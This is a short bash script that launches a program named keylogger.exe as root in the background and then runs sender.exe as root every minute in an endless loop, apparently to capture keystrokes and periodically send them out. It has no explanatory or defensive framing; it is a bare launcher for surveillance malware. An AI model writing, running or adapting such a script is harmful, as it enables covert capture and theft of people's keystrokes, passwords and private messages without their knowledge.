#!/bin/bash

# Run keylogger.exe
chmod +x keylogger.exe
sudo ./keylogger.exe &

# Run sender.exe every minute
chmod +x sender.exe
while true; do
    sudo ./sender.exe
    sleep 60
done